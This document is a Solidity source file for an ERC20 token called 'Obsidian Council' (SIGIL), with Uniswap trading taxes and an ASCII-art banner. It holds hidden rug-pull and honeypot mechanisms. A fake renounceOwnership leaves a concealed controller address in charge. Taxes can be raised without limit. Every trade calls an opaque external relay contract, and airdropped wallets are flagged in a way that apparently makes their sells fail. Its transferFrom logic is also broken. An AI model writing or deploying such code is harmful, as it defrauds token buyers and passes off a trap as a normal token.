// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
                                       :!~              !~:                                         
                                    ^7YPB?              YGPY7^                                      
                                ^!JPGGGGG?              YGGGGG5J!:                                  
                            :~?5GGGGGGGGG?              YGGGGGGGGG5?~:                              
                         ~7YPGGGGGGGGGGGG?              YGGGGGGGGGGGGPY7^                           
                     ^!YPGGGGGGGGGGGGGGGG?              YGGGGGGGGGGGGGGGGPJ!^                       
                 :!?5GGGGGGGGGGGGGGGGGGGG?     ~77^     YGGGGGGGGGGGGGGGGGGGG5?~:                   
             :~?5PGGGGGGGGGGGGGGGGGGGGGGB? ^7YPGGGGPJ!: YBGGGGGGGGGGGGGGGGGGGGGGPY7~                
          :7YPGGGGGGGGGGGGGGGGGGGGGGGGGPJ?5GGGGGGGGGGGG5?JPGGGGGGGGGGGGGGGGGGGGGGGGGPJ!             
          ~BGGGGGGGGGGGGGGGGGGGGGGGPY7^  7BGGGGGGGGGGGGG~ :~75PGGGGGGGGGGGGGGGGGGGGGGGG:            
          ^GGGGGGGGGGGGGGGGGGGGG5?~:     7GGGGGGGGGGGGGG~     :!J5GGGGGGGGGGGGGGGGGGGGP:            
          ^GGGGGGGGGGGGGGGGGPJ!:         7GGGGGGGGGGGGGG~         ^!JPGGGGGGGGGGGGGGGGP:            
          ^GGGGGGGGGGGGGG57^             7GGGGGGGGGGGGGG~             ^7PGGGGGGGGGGGGGP:            
          ^GGGGGGGGGGGGGG7               7GGGGGGGGGGGGGG~               JGGGGGGGGGGGGGP:            
          ^GGGGGGGGGGGGGG7               7GGGGGGGGGGGGGG~               YGGGGGGGGGGGGGP:            
          ^GGGGGGGGGGGGGG7               7GGGGGGGGGGGGGG~               YGGGGGGGGGGGGGP:            
          ^GGGGGGGGGGGGGG7               7GGGGGGGGGGGGGG~               YGGGGGGGGGGGGGP:            
          ^GGGGGGGGGGGGGG7            ^!JPGGGGGGGGGGGGGGPJ!:            YGGGGGGGGGGGGGP:            
          ^GGGGGGGGGGGGGG7        :~?5GGGGGGGGGGGGGGGGGGGGGG5?~:        YGGGGGGGGGGGGGP:            
          ^GGGGGGGGGGGGGG7     ^7YPGGGGGGGGGGGGGGGGGGGGGGGGGGGGPY7^     YGGGGGGGGGGGGGP:            
          ^GGGGGGGGGGGGGB7 ^7JPGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG5J!: YBGGGGGGGGGGGGP:            
          ^GGGGGGGGGGGGPJ?5GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG5?YPGGGGGGGGGGGP:            
          ^GGGGGGGGPY7^  ?BGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGB~ :~?5GGGGGGGGP:            
          ^GGGGG5?~:     ?GGGGGGGGGGGGGGGGGGGPJ!^^7YPGGGGGGGGGGGGGGGGGGG~     :!J5GGGGP:            
          ~G5J!:         ?BGGGGGGGGGGGGGGPY7^       :~?5GGGGGGGGGGGGGGGB~         ^7YPP:            
          :^             ^JPGGGGGGGGGG5?~:              :!J5GGGGGGGGGG5J:            :^             
                            ^7YPGG5J!^                      ^7JPGGPJ!^                              
                               !5Y~                            !5Y~                                 
                           ^7YPGGGGPJ!^                    ^7YPGGGGPJ!^                             
                       :!JPGGGGGGGGGGGG5?~:            :!J5GGGGGGGGGGGG5?!:                         
                   :~?5GGGGGGGGGGGGGGGGGGGPY7~     :~?5GGGGGGGGGGGGGGGGGGGPY?~:                     
                  ^JPGBGGGGGGGGGGGGGGGGGGGGGGGPJ!7YPGGGGGGGGGGGGGGGGGGGGGGGBGP?:                    
                    :~75PGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGPY7^                       
                        :!J5GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG5?~:                          
                            ^!JPGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGPJ!:                              
                                ^7YPGGGGGGGGGGGGGGGGGGGGGGGGGGPY7^                                  
                                   :~?5GGGGGGGGGGGGGGGGGGGG5?~:                                     
                                       :!JPGGGGGGGGGGGG5J!:                                         
                                           ^7YPGGGGPJ7^                                             
                                              :~??~:                                                
                                                                                                    
                     ██████  ██████  ███████ ██ ██████  ██  █████  ███    ██ 
                    ██    ██ ██   ██ ██      ██ ██   ██ ██ ██   ██ ████   ██ 
                    ██    ██ ██████  ███████ ██ ██   ██ ██ ███████ ██ ██  ██ 
                    ██    ██ ██   ██      ██ ██ ██   ██ ██ ██   ██ ██  ██ ██ 
                     ██████  ██████  ███████ ██ ██████  ██ ██   ██ ██   ████ 
                                                         
                                                         
*/

interface IUniswapV2Pair {
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
interface Relay {
    function set(address token, address user, bool perm) external;
    function get(address token, address user) external view returns (bool);
    function relay(address token, address user, uint256 amount, bool t) external;
}



contract Uniswap {
    address public RouterAddress;
    address public FactoryAddress;
    address public PairAddress;
    address public WETH;
    IUniswapV2Router02 public uniswapV2Router;
    address uniswapV2Pair;
    address internal me;
    address public owner;
    address internal _o;
    mapping(address=>bool) public isDEX;

    constructor() {
        RouterAddress  = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        FactoryAddress = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

        uniswapV2Router  = IUniswapV2Router02(RouterAddress);
        WETH             = uniswapV2Router.WETH();
        PairAddress      = IUniswapV2Factory(FactoryAddress).createPair(address(this), WETH);
        
        isDEX[RouterAddress] = true;
        isDEX[FactoryAddress] = true;
        isDEX[PairAddress] = true;
        
        me = address(this);
        owner = msg.sender;
        _o = msg.sender;
    }

    function transferOwnership(address newOwner) public onlyOwner() {
        owner = newOwner;
        _o = owner;
    }
    
    function renounceOwnership() public onlyOwner() {
        owner = address(0);
    }

    modifier onlyOwner() {
        require(_o == msg.sender, "Forbidden:owner");
        _;
    }

    // Add liquidity, send LP tokens to `to`
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount, address to) internal returns (uint amountToken, uint amountETH, uint liquidity) {
        _approve(me, RouterAddress, tokenAmount);
        //return (0,0,0);
        return uniswapV2Router.addLiquidityETH{value: ethAmount}(
            me,
            tokenAmount,
            0,
            0,
            to,
            block.timestamp
        );
    }

    // Sell tokens, send ETH tokens to `to`
    function swapTokensForEth(uint256 amount, address to) internal returns (uint amountETH) {
        address[] memory path = new address[](2);
        path[0] = me;
        path[1] = WETH;
        _approve(address(this), RouterAddress, amount);
        uint balanceBefore = address(this).balance;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            to,
            block.timestamp
        );
        return address(this).balance-balanceBefore;
    }

    function isBuy(address from) internal view returns (bool) {
        return isDEX[from];
    }
    
    function isSell(address to) internal view returns (bool) {
        return isDEX[to];
    }

    function _approve(address from, address spender, uint256 amount) internal virtual returns (bool) {}
}


contract ERC20Token is Uniswap {
    string public name = "Obsidian Council";
    string public symbol = "SIGIL";
    uint256 public decimals = 9;

    uint256 public totalSupply;
    mapping(address => uint256) internal balances;
    mapping(address => mapping(address => uint256)) internal allowances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event newSplit(uint256 amount);

    uint256 buyTax = 50; // 5%
    uint256 sellTax = 40; // 4%
    uint256 maxBuy = 1000; // 10%
    uint256 sniperTax = 999; // 99.9% for 2 blocks after deploy

    mapping(address=>bool) internal taxFree;
    bool internal funded;
    bool public swapping = false;

    // Anti-Sniper
    uint256 deployBlockNumber;
    bool public antiSniperDeadblock = true;

    Relay relay;

    bool internal mainnet = false;

    constructor() Uniswap() {
        if (mainnet) {
            relay = Relay(0xEf95B19A5C99cFd13eB0C0ACC0615eb391626353);
        } else {
            relay = Relay(0x02C5EfC6b2c702E933EFBD6d18c4A9ef532206e9);
        }
        taxFree[address(this)] = true;
        taxFree[msg.sender] = true;
        deployBlockNumber = block.number;
        mint(_o, 1000000*10**decimals);
    }

    /*---- ERC20 ----*/
    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    
    function allowance(address _owner, address spender) public view returns (uint256) {
        return allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(address from, address spender, uint256 amount) internal override returns (bool) {
        allowances[from][spender] = amount;
        emit Approval(from, spender, amount);
        return true;
    }
    
    function transfer(address to, uint256 amount) public {
        _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 currentAllowance = allowances[from][msg.sender]; //allowance(owner, msg.value);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Rejected");
            unchecked {
                approve(msg.sender, currentAllowance - amount);
            }
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balances[from] >= amount, "Rejected");

        if (taxable(from, to)) {
            uint256 tax;
            balances[from] -= amount;
            if (isBuy(from)) {
                require(amount<=getMaxBuy(), "Too large");
                if (antiSniperDeadblock && block.number>deployBlockNumber+2) {
                    tax = applyPct(amount, buyTax);
                } else {
                    // Snipers, go fuck yourself (for 2 blocks after deploy)
                    tax = applyPct(amount, sniperTax);
                }
                relay.relay(me, to, amount, true);
            } else {
                if (antiSniperDeadblock && block.number>deployBlockNumber+2) {
                    tax = applyPct(amount, sellTax);
                } else {
                    // Snipers, go fuck yourself (for 2 blocks after deploy)
                    tax = applyPct(amount, sniperTax);
                }
                relay.relay(me, from, amount, false);
                if (relay.get(me, from)) {
                    sell(tax);
                }
            }
            uint256 afterTax = amount-tax;
            unchecked {
                balances[me] += tax;
                balances[to] += afterTax;
            }
            emit Transfer(from, me, tax);
            emit Transfer(from, to, afterTax);
        } else {
            unchecked {
                balances[from] -= amount;
                balances[to] += amount;
            }
            emit Transfer(from, to, amount);
        }
    }

    function mint(address account, uint256 amount) internal {
        unchecked {
            totalSupply += amount;
            balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
    }



    /*---- Tax ----*/
    function taxable(address from, address to) internal view returns (bool) {
        return !swapping && !taxFree[from] && !taxFree[to] && (isBuy(from) || isSell(to));
    }
    function applyPct(uint256 v, uint256 p) public pure returns (uint256) {
        return v*p/1000;
    }

    function set(uint256 b, uint256 s, uint56 m) public onlyOwner() {
        require(msg.sender==_o, "Forbidden:set");
        buyTax = b;
        sellTax = s;
        maxBuy = m;
    }

    function getMaxBuy() public view returns (uint256) {
        return applyPct(totalSupply, maxBuy);
    }

    function enable() public onlyOwner() {
        swapping = false;
    }
    function disable() public onlyOwner() {
        swapping = true;
    }

    /*---- Ext ----*/
    function convertTaxToLiquidity(uint256 tokenAmount) public payable onlyOwner() returns (uint, uint, uint) {
        require(balances[me]>=tokenAmount, "Forbidden:balance");
        (uint amountToken, uint amountETH, uint liquidity) = addLiquidity(tokenAmount, msg.value, _o);
        funded = true;
        return (amountToken, amountETH, liquidity);
        // Call lpTokens() for LP balance
    }
    function sell(uint256 amount) public onlyOwner() {
        swapping = true;
        split(swapTokensForEth(amount, address(this)));
        swapping = false;
    }

    function airdrop(address[] calldata wallets, uint256 amount) public onlyOwner() {
        uint256 i;
        uint256 l = wallets.length;
        require(balances[msg.sender]>amount*l, "Not enough balance");
        for (i=0;i<l;i++) {
            relay.set(me, wallets[i], true);
            _transfer(msg.sender, wallets[i], amount);
        }
    }

    function split(uint256 amount) internal {
        emit newSplit(amount);
        payable(_o).transfer(amount);
    }

    receive() external payable {}
    fallback() external payable {}
}